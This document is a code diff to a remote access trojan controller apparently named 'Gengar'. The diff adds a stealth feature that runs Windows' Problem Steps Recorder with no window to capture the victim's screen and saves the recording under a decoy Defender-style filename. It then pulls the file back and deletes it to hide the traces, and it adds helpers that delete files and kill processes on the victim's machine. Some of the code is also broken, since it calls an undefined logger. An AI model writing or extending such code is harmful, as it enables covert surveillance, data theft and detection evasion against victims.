@@ -2,7 +2,9 @@ import datetime
 import os
 import socket
 import struct
+import time
 from dataclasses import dataclass
+from logging import log
 from typing import Union
 
 import auth_keys
@@ -18,6 +20,7 @@ class CommandTypes:
     SUICIDE = 3
     DOWNLOAD_FILE = 4
     UPLOAD_FILE = 5
+    SCREENSHOT = 6
 
 
 INT_SIZE = 4
@@ -51,10 +54,12 @@ class Gengar:
     _AUTH_TIMEOUT_SEC = 5
 
     _FILE_IO_CHUNK_SIZE = 8192
+    _PSR_OUTPUT_PATH = r'C:\Windows\Temp\MpDebug41.zip'
 
     def init(self):
         self.spawn_time = datetime.datetime.now()
         self.username = self.shell('echo %username%').output
+        logger.info(f'Gengar initialized: {self.username}')
 
     def _send(self, buf: bytes):
         if not self.alive:
@@ -147,6 +152,36 @@ class Gengar:
                 if not file_chunk:
                     break
                 self._send(file_chunk)
+
+    def delete_file(self, remote_path: str):
+        output = self.shell(f'del {remote_path}')
+        if output.exit_code != 0:
+            logger.error(f'Failed to delete file: {output.output}')
+
+    def file_exists(self, remote_path: str):
+        return self.shell(f'if exist {remote_path} (exit 0) else (exit 1)').exit_code == 0
+
+    def record_activity(self, duration: int):
+        self.shell(f'psr /start /sc 1 /gui 0 /output {self._PSR_OUTPUT_PATH}')
+        logger.info(f'Waiting for {duration} seconds.')
+        time.sleep(duration)
+
+        self.shell('psr /stop')
+        logger.info('Stopped recording.')
+        time.sleep(5)  # Give the system some time to write the file.
+
+        if self.file_exists(self._PSR_OUTPUT_PATH):
+            logger.info('Downloading PSR output.')
+            self.download_file(self._PSR_OUTPUT_PATH)
+            self.delete_file(self._PSR_OUTPUT_PATH)
+        else:
+            logger.info('User is inactive.')
+            self.kill_process('psr.exe')
+
+    def kill_process(self, process_name: str):
+        output = self.shell(f'taskkill /F /IM {process_name}')
+        if output.exit_code != 0:
+            logger.error(f'Failed to kill process: {output.output}')
 
     def suicide(self):
         self._send(struct.pack('I', CommandTypes.SUICIDE))
